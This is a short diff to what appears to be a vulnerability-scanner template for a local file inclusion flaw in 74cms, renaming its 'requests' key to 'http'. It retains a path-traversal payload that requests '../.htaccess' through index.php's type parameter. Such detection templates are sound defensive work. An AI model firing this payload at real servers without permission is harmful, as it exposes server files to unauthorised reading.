@@ -8,7 +8,7 @@ info:
   reference: http://wooyun.org/bugs/wooyun-2014-086882
   tags: 74cms,local_file_include
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/index.php?m=&c=M&a=index&type=../.htaccess"
